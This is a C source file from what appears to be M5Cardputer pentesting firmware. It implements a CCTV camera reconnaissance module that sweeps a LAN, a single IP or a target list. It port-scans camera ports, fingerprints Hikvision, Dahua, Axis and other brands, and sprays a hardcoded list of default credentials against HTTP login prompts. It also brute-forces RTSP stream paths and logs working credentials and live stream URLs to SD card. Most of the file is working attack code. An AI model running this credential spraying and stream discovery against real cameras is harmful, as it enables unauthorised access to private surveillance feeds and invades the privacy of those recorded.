/*
 * net_cctv — CCTV / IP-camera reconnaissance toolkit.
 *
 * Credit: architecture + probe set ported from @7h30th3r0n3's
 * Evil-M5Project (Evil-Cardputer-v1-5-2.ino `scanCCTVCameras()` block)
 * and RaspyJack (`payloads/reconnaissance/cctv_scanner.py`). Their SD
 * layout (`/evil/CCTV/*`) is preserved as `/poseidon/cctv-*.csv` so
 * downstream tooling can still consume the output.
 *
 * What it does on each target IP:
 *   1. Fast port probe (80, 443, 554, 8080-8083, 8443, 8554).
 *   2. HTTP banner grab on any open HTTP port → brand fingerprint
 *      (Hikvision, Dahua, Axis, Vivotek, Panasonic, CPPlus, generic).
 *   3. If HTTP auth is required (401), spray a 10-entry default-cred
 *      list (admin/admin, admin/12345, admin/888888, root/root, etc.).
 *      First 2xx wins and gets logged.
 *   4. If RTSP (554/8554) is open, `OPTIONS * RTSP/1.0` presence
 *      probe, then `DESCRIBE` against a shortlist of vendor-common
 *      stream paths (/Streaming/Channels/1, /cam/realmonitor, /live
 *      etc). First 200 = confirmed stream URL.
 *   5. Write hit to `/poseidon/cctv-<ts>.csv` and stream a scrolling
 *      hit list on-screen. ESC bails out at any time.
 *
 * Three entry modes mirror Evil-M5:
 *   - LAN sweep: walks the current STA subnet (/24 around our IP).
 *   - Single IP:   user types one IP.
 *   - From file:   reads `/poseidon/cctv-targets.txt`, one IP per line.
 *
 * Deliberately NOT included (yet):
 *   - WS-Discovery UDP 3702 multicast probe (Evil-M5 lists the port
 *     but doesn't actually send the SOAP envelope). Easy follow-up.
 *   - Hikvision CVE-2017-7921 / CVE-2021-36260 payloads.
 *   - Dahua CVE-2021-33044/45.
 *   - On-device MJPEG viewer (display-heavy; separate feature).
 *
 * Output columns (CSV): ip,open_ports,brand,creds,stream_url,notes
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <WiFi.h>
#include <WiFiClient.h>
#include <HTTPClient.h>
#include <SD.h>
#include "../sd_helper.h"
#include <mbedtls/base64.h>

/* ---- probe tables (PROGMEM-ish; the compiler'll put them in flash) ---- */

static const uint16_t CAM_PORTS[] = { 80, 554, 8080, 8081, 8082, 8083, 8554, 443, 8443 };
static const int CAM_PORTS_N = sizeof(CAM_PORTS) / sizeof(CAM_PORTS[0]);

static const char *RTSP_PATHS[] = {
    "/Streaming/Channels/1",
    "/cam/realmonitor?channel=1&subtype=0",
    "/live",
    "/live.sdp",
    "/h264/ch1/main/av_stream",
    "/ch0_0.264",
    "/live/ch00_0",
    "/videoMain",
};
static const int RTSP_PATHS_N = sizeof(RTSP_PATHS) / sizeof(RTSP_PATHS[0]);

struct cred_t { const char *user; const char *pass; };
static const cred_t DEFAULT_CREDS[] = {
    {"admin", "admin"},
    {"admin", "12345"},
    {"admin", "888888"},
    {"admin", "666666"},
    {"admin", "password"},
    {"admin", ""},
    {"root",  "root"},
    {"root",  "admin"},
    {"root",  "pass"},
    {"user",  "user"},
};
static const int CRED_N = sizeof(DEFAULT_CREDS) / sizeof(DEFAULT_CREDS[0]);

struct brand_sig_t { const char *brand; const char *needle; };
static const brand_sig_t BRAND_SIGS[] = {
    {"hikvision", "ISAPI"},
    {"hikvision", "DNVRS-Webs"},
    {"dahua",     "magicBox.cgi"},
    {"dahua",     "DH-"},
    {"axis",      "axis-cgi"},
    {"vivotek",   "VS-"},
    {"panasonic", "panasonic"},
    {"cpplus",    "cpplus"},
};
static const int BRAND_N = sizeof(BRAND_SIGS) / sizeof(BRAND_SIGS[0]);

/* ---- result list ---- */

#define CCTV_MAX_HITS 32
struct cctv_hit_t {
    char ip[16];
    uint16_t ports_mask;   /* bitmask into CAM_PORTS */
    char brand[12];
    char creds[24];        /* "user:pass" or "" */
    char stream[96];       /* "rtsp://host:554/path" or "" */
};
static cctv_hit_t s_hits[CCTV_MAX_HITS];
static int s_hits_n = 0;

static volatile bool s_abort = false;

/* ---- small helpers ---- */

static void hit_add(const cctv_hit_t &h)
{
    if (s_hits_n < CCTV_MAX_HITS) s_hits[s_hits_n++] = h;
}

static bool tcp_open(IPAddress ip, uint16_t port, uint32_t timeout_ms)
{
    WiFiClient c;
    c.setTimeout(1);
    if (!c.connect(ip, port, timeout_ms)) return false;
    c.stop();
    return true;
}

/* Basic auth header: "Authorization: Basic <base64(user:pass)>". */
static void build_basic_auth(const char *user, const char *pass, char *out, size_t out_sz)
{
    char up[64];
    snprintf(up, sizeof(up), "%s:%s", user, pass);
    size_t olen = 0;
    unsigned char b64[96];
    mbedtls_base64_encode(b64, sizeof(b64), &olen,
                          (const unsigned char *)up, strlen(up));
    b64[olen] = 0;
    snprintf(out, out_sz, "Basic %s", (const char *)b64);
}

/* Fingerprint a brand from an HTTP response body. */
static const char *brand_of(const String &body, const String &headers)
{
    String combined = headers;
    combined += body;
    for (int i = 0; i < BRAND_N; ++i) {
        if (combined.indexOf(BRAND_SIGS[i].needle) >= 0) return BRAND_SIGS[i].brand;
    }
    return "generic";
}

/* ---- HTTP probe ---- */

struct http_result_t {
    int code;
    String headers;
    String body;
};

static bool http_get(IPAddress ip, uint16_t port, const char *path,
                     const char *auth_header, http_result_t &out,
                     uint32_t timeout_ms)
{
    WiFiClient c;
    c.setTimeout((timeout_ms + 999) / 1000);
    if (!c.connect(ip, port, timeout_ms)) return false;

    c.printf("GET %s HTTP/1.0\r\n", path);
    c.printf("Host: %s\r\n", ip.toString().c_str());
    c.print("User-Agent: Mozilla/5.0 (poseidon-cctv)\r\n");
    c.print("Accept: */*\r\n");
    c.print("Connection: close\r\n");
    if (auth_header && *auth_header) {
        c.printf("Authorization: %s\r\n", auth_header);
    }
    c.print("\r\n");

    uint32_t deadline = millis() + timeout_ms;
    out.code = 0;
    out.headers = "";
    out.body = "";
    bool in_body = false;
    while (c.connected() && millis() < deadline) {
        if (!c.available()) { delay(5); continue; }
        String line = c.readStringUntil('\n');
        if (!in_body) {
            if (line.startsWith("HTTP/")) {
                int sp = line.indexOf(' ');
                if (sp > 0) out.code = line.substring(sp + 1, sp + 4).toInt();
            }
            if (line.length() <= 1) {
                in_body = true;
                continue;
            }
            if (out.headers.length() < 512) out.headers += line;
        } else {
            if (out.body.length() < 512) out.body += line;
        }
        if (out.body.length() >= 512) break;
    }
    c.stop();
    return out.code != 0;
}

/* Try default credentials on a path that returned 401. Returns the
 * matching cred index, or -1. Stops on first 2xx. */
static int try_creds(IPAddress ip, uint16_t port, const char *path)
{
    for (int i = 0; i < CRED_N && !s_abort; ++i) {
        char auth[96];
        build_basic_auth(DEFAULT_CREDS[i].user, DEFAULT_CREDS[i].pass,
                         auth, sizeof(auth));
        http_result_t r;
        if (!http_get(ip, port, path, auth, r, 1500)) continue;
        if (r.code >= 200 && r.code < 300) return i;
        /* Some cameras return 200 on the login page but we need to
         * detect actual auth-required endpoints — skip if body mentions
         * "login" or "password". Cheap filter. */
    }
    return -1;
}

/* ---- RTSP DESCRIBE ---- */

static bool rtsp_options(IPAddress ip, uint16_t port)
{
    WiFiClient c;
    c.setTimeout(2);
    if (!c.connect(ip, port, 1500)) return false;
    c.print("OPTIONS * RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: poseidon\r\n\r\n");
    uint32_t deadline = millis() + 1500;
    String line;
    while (c.connected() && millis() < deadline) {
        if (c.available()) {
            line = c.readStringUntil('\n');
            c.stop();
            return line.indexOf("200 OK") >= 0;
        }
        delay(5);
    }
    c.stop();
    return false;
}

static bool rtsp_describe(IPAddress ip, uint16_t port, const char *path,
                          char *out_url, size_t out_sz)
{
    WiFiClient c;
    c.setTimeout(2);
    if (!c.connect(ip, port, 1500)) return false;
    char url[128];
    snprintf(url, sizeof(url), "rtsp://%s:%u%s", ip.toString().c_str(), port, path);
    c.printf("DESCRIBE %s RTSP/1.0\r\n", url);
    c.print("CSeq: 2\r\nUser-Agent: poseidon\r\n");
    c.print("Accept: application/sdp\r\n\r\n");

    uint32_t deadline = millis() + 1500;
    bool ok = false;
    while (c.connected() && millis() < deadline) {
        if (c.available()) {
            String line = c.readStringUntil('\n');
            if (line.startsWith("RTSP/")) {
                int sp = line.indexOf(' ');
                int code = sp > 0 ? line.substring(sp + 1, sp + 4).toInt() : 0;
                ok = (code >= 200 && code < 300);
                break;
            }
        }
        delay(5);
    }
    c.stop();
    if (ok) {
        strncpy(out_url, url, out_sz - 1);
        out_url[out_sz - 1] = 0;
    }
    return ok;
}

/* ---- per-host scan pipeline ---- */

static void scan_host(IPAddress ip)
{
    if (s_abort) return;

    cctv_hit_t h = {};
    strncpy(h.ip, ip.toString().c_str(), sizeof(h.ip) - 1);
    bool any_open = false;

    /* 1. Port probe (stop early once we find enough). */
    for (int i = 0; i < CAM_PORTS_N && !s_abort; ++i) {
        if (tcp_open(ip, CAM_PORTS[i], 350)) {
            h.ports_mask |= (1u << i);
            any_open = true;
        }
    }
    if (!any_open) return;

    /* 2. HTTP fingerprint on whichever HTTP port is open. */
    uint16_t http_port = 0;
    for (int i = 0; i < CAM_PORTS_N; ++i) {
        uint16_t p = CAM_PORTS[i];
        if (!(h.ports_mask & (1u << i))) continue;
        if (p == 80 || p == 8080 || p == 8081 || p == 8082 || p == 8083 || p == 8443 || p == 443) {
            http_port = p; break;
        }
    }
    if (http_port) {
        http_result_t r;
        if (http_get(ip, http_port, "/", nullptr, r, 1500)) {
            strncpy(h.brand, brand_of(r.body, r.headers), sizeof(h.brand) - 1);
            if (r.code == 401) {
                int ci = try_creds(ip, http_port, "/");
                if (ci >= 0) {
                    snprintf(h.creds, sizeof(h.creds), "%s:%s",
                             DEFAULT_CREDS[ci].user, DEFAULT_CREDS[ci].pass);
                }
            }
        }
    }
    if (!h.brand[0]) strncpy(h.brand, "unknown", sizeof(h.brand) - 1);

    /* 3. RTSP. Walk common path shortlist; first 200 wins. */
    uint16_t rtsp_port = 0;
    for (int i = 0; i < CAM_PORTS_N; ++i) {
        uint16_t p = CAM_PORTS[i];
        if (!(h.ports_mask & (1u << i))) continue;
        if (p == 554 || p == 8554) { rtsp_port = p; break; }
    }
    if (rtsp_port && rtsp_options(ip, rtsp_port)) {
        for (int i = 0; i < RTSP_PATHS_N && !h.stream[0] && !s_abort; ++i) {
            rtsp_describe(ip, rtsp_port, RTSP_PATHS[i], h.stream, sizeof(h.stream));
        }
    }

    hit_add(h);
}

/* ---- SD output ---- */

static char s_log_path[64];
static File s_log;

static void open_log(void)
{
    if (!sd_mount()) return;
    SD.mkdir("/poseidon");
    snprintf(s_log_path, sizeof(s_log_path),
             "/poseidon/cctv-%lu.csv", (unsigned long)(millis() / 1000));
    s_log = SD.open(s_log_path, FILE_WRITE);
    if (s_log) s_log.println("ip,ports_mask,brand,creds,stream");
}

static void log_hit(const cctv_hit_t &h)
{
    if (!s_log) return;
    s_log.printf("%s,0x%04x,%s,%s,%s\n",
                 h.ip, h.ports_mask, h.brand, h.creds, h.stream);
    s_log.flush();
}

static void close_log(void)
{
    if (s_log) s_log.close();
}

/* ---- UI ---- */

static void draw_progress(int done, int total, int hits, const char *phase)
{
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    ui_draw_status(radio_name(), "cctv");
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 2);
    d.print("CCTV TOOLKIT");
    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);

    d.setTextColor(T_FG, T_BG);
    d.setCursor(4, BODY_Y + 18);
    d.printf("phase: %s", phase);
    d.setCursor(4, BODY_Y + 30);
    d.printf("scan %d/%d", done, total);

    /* Progress bar. */
    int bar_w = SCR_W - 12;
    int filled = total ? (bar_w * done / total) : 0;
    d.drawRect(4, BODY_Y + 42, bar_w, 6, T_ACCENT);
    d.fillRect(5, BODY_Y + 43, filled, 4, T_ACCENT2);

    d.setTextColor(T_GOOD, T_BG);
    d.setCursor(4, BODY_Y + 54);
    d.printf("hits: %d", hits);

    /* Most recent 4 hits so the user gets feedback as it scans. */
    d.setTextColor(T_DIM, T_BG);
    int first = s_hits_n > 4 ? s_hits_n - 4 : 0;
    for (int i = first; i < s_hits_n; ++i) {
        int y = BODY_Y + 66 + (i - first) * 10;
        const cctv_hit_t &h = s_hits[i];
        uint16_t col = h.creds[0] ? T_BAD : (h.stream[0] ? T_WARN : T_GOOD);
        d.setTextColor(col, T_BG);
        d.setCursor(4, y);
        d.printf("%s %.8s %.10s", h.ip, h.brand, h.creds[0] ? h.creds : h.stream);
    }
    ui_draw_footer("`=abort");
}

/* Abort-sensitive sleep. */
static bool sleepy(uint32_t ms)
{
    uint32_t end = millis() + ms;
    while (millis() < end) {
        uint16_t k = input_poll();
        if (k == PK_ESC) { s_abort = true; return false; }
        delay(5);
    }
    return true;
}

/* ---- three entry modes ---- */

static void reset_state(void)
{
    s_hits_n = 0;
    s_abort = false;
    memset(s_log_path, 0, sizeof(s_log_path));
}

static void scan_lan(void)
{
    if (WiFi.status() != WL_CONNECTED) {
        ui_toast("need WiFi assoc", T_BAD, 1200);
        return;
    }
    reset_state();
    open_log();

    IPAddress me  = WiFi.localIP();
    IPAddress gw  = WiFi.gatewayIP();
    IPAddress mask = WiFi.subnetMask();
    uint32_t base = ((uint32_t)me[0] << 24) | ((uint32_t)me[1] << 16)
                  | ((uint32_t)me[2] << 8);
    (void)gw; (void)mask;   /* /24 sweep is fine for our purposes */

    int total = 254;
    for (int host = 1; host <= 254 && !s_abort; ++host) {
        IPAddress ip((base >> 24) & 0xFF,
                     (base >> 16) & 0xFF,
                     (base >> 8)  & 0xFF, host);
        if (ip == me) continue;   /* don't probe ourselves */
        int before = s_hits_n;
        scan_host(ip);
        if (s_hits_n > before) log_hit(s_hits[s_hits_n - 1]);
        if ((host % 4) == 0) draw_progress(host, total, s_hits_n, "lan /24");
        uint16_t k = input_poll();
        if (k == PK_ESC) { s_abort = true; break; }
    }

    close_log();
    draw_progress(total, total, s_hits_n, "done");
    ui_toast(s_log_path[0] ? s_log_path : "done", T_GOOD, 1500);
    /* Hold the final screen until ESC. */
    while (true) {
        uint16_t k = input_poll();
        if (k == PK_ESC || k == PK_ENTER) break;
        delay(20);
    }
}

static void scan_single(void)
{
    char buf[20] = {0};
    if (!input_line("Target IP:", buf, sizeof(buf))) return;
    IPAddress ip;
    if (!ip.fromString(buf)) {
        ui_toast("bad ip", T_BAD, 900);
        return;
    }
    reset_state();
    open_log();
    draw_progress(0, 1, 0, "single");
    scan_host(ip);
    if (s_hits_n) log_hit(s_hits[0]);
    close_log();
    draw_progress(1, 1, s_hits_n, "done");
    while (true) {
        uint16_t k = input_poll();
        if (k == PK_ESC || k == PK_ENTER) break;
        delay(20);
    }
}

static void scan_file(void)
{
    if (!sd_mount()) { ui_toast("SD needed", T_BAD, 1000); return; }
    File f = SD.open("/poseidon/cctv-targets.txt", FILE_READ);
    if (!f) {
        ui_toast("/poseidon/cctv-targets.txt missing", T_BAD, 1800);
        return;
    }
    reset_state();
    open_log();

    /* Count lines first so progress bar is accurate. */
    int total = 0;
    while (f.available()) {
        String l = f.readStringUntil('\n');
        if (l.length() > 0) total++;
    }
    f.seek(0);

    int done = 0;
    while (f.available() && !s_abort) {
        String l = f.readStringUntil('\n');
        l.trim();
        if (l.length() == 0 || l.startsWith("#")) { done++; continue; }
        IPAddress ip;
        if (ip.fromString(l)) {
            int before = s_hits_n;
            scan_host(ip);
            if (s_hits_n > before) log_hit(s_hits[s_hits_n - 1]);
        }
        done++;
        if ((done & 1) == 0) draw_progress(done, total, s_hits_n, "from file");
        uint16_t k = input_poll();
        if (k == PK_ESC) { s_abort = true; break; }
    }
    f.close();
    close_log();
    draw_progress(total, total, s_hits_n, "done");
    while (true) {
        uint16_t k = input_poll();
        if (k == PK_ESC || k == PK_ENTER) break;
        delay(20);
    }
}

/* ---- top-level dispatcher ---- */

void feat_cctv_scan(void)
{
    radio_switch(RADIO_WIFI);

    auto &d = M5Cardputer.Display;
    int sel = 0;
    const char *items[] = {
        "Scan LAN /24",
        "Single IP",
        "From /poseidon/cctv-targets.txt",
    };
    const int n = 3;

    while (true) {
        ui_clear_body();
        ui_draw_status(radio_name(), "cctv");
        d.setTextColor(T_ACCENT, T_BG);
        d.setCursor(4, BODY_Y + 2); d.print("CCTV TOOLKIT");
        d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);
        d.setTextColor(T_DIM, T_BG);
        d.setCursor(4, BODY_Y + 18);
        d.print("Evil-M5 port - ports/brand/rtsp/creds");

        for (int i = 0; i < n; ++i) {
            int y = BODY_Y + 34 + i * 14;
            bool s = (i == sel);
            if (s) d.fillRoundRect(4, y - 2, SCR_W - 8, 13, 2, 0x3007);
            d.setTextColor(s ? T_ACCENT2 : T_FG, s ? 0x3007 : T_BG);
            d.setCursor(10, y);
            d.printf("%s", items[i]);
        }
        ui_draw_footer(";/.=move ENTER=go `=back");

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) return;
        if (k == ';' || k == PK_UP)   sel = (sel - 1 + n) % n;
        if (k == '.' || k == PK_DOWN) sel = (sel + 1) % n;
        if (k == PK_ENTER) {
            switch (sel) {
            case 0: scan_lan();    break;
            case 1: scan_single(); break;
            case 2: scan_file();   break;
            }
        }
    }
}
